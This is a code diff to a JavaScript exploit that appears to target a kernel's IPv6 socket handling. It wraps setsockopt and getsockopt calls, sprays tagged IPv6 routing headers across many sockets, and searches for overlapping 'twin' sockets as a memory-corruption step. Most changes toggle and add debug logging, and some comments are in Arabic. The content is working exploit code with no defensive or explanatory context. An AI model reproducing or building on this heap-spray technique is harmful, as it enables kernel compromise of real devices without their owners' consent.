@@ -201,10 +201,7 @@ function build_rthdr(buf, size) {
   var len = (size >> 3) - 1 & ~1;
   var actual_size = (len + 1) << 3;
 
-  log("[RTHDR-BUILD] size=" + size +
-      " len=" + len +
-      " actual_size=" + actual_size +
-      " buf=" + buf);
+  //log("[RTHDR-BUILD] size=" + size + " len=" + len + " actual_size=" + actual_size + " buf=" + buf);
 
   write8(buf.add(0x00), 0);              // ip6r_nxt
   write8(buf.add(0x01), len);            // ip6r_len
@@ -223,14 +220,11 @@ function set_sockopt(sd, level, optname, optval, optlen) {
 var real_set_sockopt = set_sockopt;
 
 set_sockopt = function(sd, level, optname, optval, optlen) {
-  log("[SETSOCKOPT] BEFORE sd=" + sd + 
-      " level=" + level + 
-      " optname=" + optname + 
-      " optlen=" + optlen);
+  //log("[SETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen=" + optlen);
 
   var ret = real_set_sockopt(sd, level, optname, optval, optlen);
 
-  log("[SETSOCKOPT] AFTER ret=" + ret);
+  //log("[SETSOCKOPT] AFTER ret=" + ret);
 
   return ret;
 };
@@ -262,16 +256,12 @@ var real_get_sockopt = get_sockopt;
 
 get_sockopt = function(sd, level, optname, optval, optlen) {
   write32(sockopt_len_ptr, optlen);
-  log("[GETSOCKOPT] BEFORE sd=" + sd +
-      " level=" + level +
-      " optname=" + optname +
-      " optlen_in=" + optlen);
+  //log("[GETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen_in=" + optlen);
 
   var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
 
   var out_len = read32(sockopt_len_ptr);
-  log("[GETSOCKOPT] AFTER result=" + result +
-      " out_len=" + out_len);
+  //log("[GETSOCKOPT] AFTER result=" + result + " out_len=" + out_len);
 
   if (result.eq(BigInt_Error)) {
     throw new Error('get_sockopt error: ' + hex(result));
@@ -289,11 +279,11 @@ var real_set_rthdr = set_rthdr;
 
 // 2) اعمل wrapper فوقها
 set_rthdr = function(sock, buf, len) {
-  log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
+  //log("[RTHDR] BEFORE sock=" + sock + " len=" + len);
 
   var ret = real_set_rthdr(sock, buf, len);
 
-  log("[RTHDR] AFTER ret=" + ret);
+  //log("[RTHDR] AFTER ret=" + ret);
 
   return ret;
 };
@@ -306,9 +296,9 @@ function get_rthdr(sd, buf, max_len) {
 var real_get_rthdr = get_rthdr;
 
 get_rthdr = function(sock, buf, len) {
-  log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
+  //log("[RTHDR-GET] BEFORE sock=" + sock + " max_len=" + len);
   var ret = real_get_rthdr(sock, buf, len);
-  log("[RTHDR-GET] AFTER ret=" + ret);
+  //log("[RTHDR-GET] AFTER ret=" + ret);
   return ret;
 };
 
@@ -844,47 +834,101 @@ function fill_buffer_64(buf, val, len) {
   // log("[BUF-FILL] wrote @ offset " + i);
 
 }
+var real_find_twins = find_twins;
+
+find_twins = function () {
+  log("[TWINS] START");
+
+  var result = real_find_twins();
+
+  if (result) {
+    log("[TWINS] RESULT = FOUND i=" + twins[0] + " j=" + twins[1]);
+  } else {
+    log("[TWINS] RESULT = NOT FOUND");
+  }
+
+  return result;
+};
+
+
 function find_twins() {
   var count = 0;
   var val, i, j;
   var zeroMemoryCount = 0;
+
   twins[0] = -1;
   twins[1] = -1;
+
   var spray_add = spray_rthdr.add(0x04);
   var leak_add = leak_rthdr.add(0x04);
+
   while (count < MAX_ROUNDS_TWIN) {
-    if (typeof debugging !== 'undefined' && debugging.info && debugging.info.memory && debugging.info.memory.available === 0) {
+
+    // مراقبة حالة الذاكرة (منطق عام)
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
+
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
+        log("[TWINS] MEMORY LIMIT REACHED");
         cleanup();
         return false;
       }
+
     } else {
       zeroMemoryCount = 0;
     }
+
+
+    // المرحلة الأولى: كتابة
     for (i = 0; i < ipv6_socks.length; i++) {
-      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // تعديل رقم 2 (memory barrier)
+      read32(spray_add); // memory barrier (منطق عام)
 
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
+
+
+    // المرحلة الثانية: قراءة + قرار
     for (i = 0; i < ipv6_socks.length; i++) {
       if (ipv6_socks[i].eq(BigInt_Error)) continue;
-      write32(leak_add, 0); // تعديل رقم 4
+
+      write32(leak_add, 0);
       get_rthdr(ipv6_socks[i], leak_rthdr, 8);
+
       val = read32(leak_add);
       j = val & 0xFFFF;
-      if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j && j >= 0 && j < ipv6_socks.length) {
+
+      // لوج منطقي قبل القرار
+      log("[TWINS-CHECK] i=" + i + " val=" + val + " j=" + j);
+
+      // الشرط العام
+      var condition =
+        ((val & 0xFFFF0000) === RTHDR_TAG) &&
+        (i !== j) &&
+        (j >= 0) &&
+        (j < ipv6_socks.length);
+
+      // لوج القرار
+      log("[TWINS-CONDITION] i=" + i + " j=" + j + " cond=" + condition);
+
+      if (condition) {
+        log("[TWINS-FOUND] i=" + i + " j=" + j);
         twins[0] = i;
         twins[1] = j;
-        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
+
+      log("[TWINS-NOPE] i=" + i + " j=" + j);
     }
+
     count++;
   }
+
   twins[0] = -1;
   twins[1] = -1;
   return false;
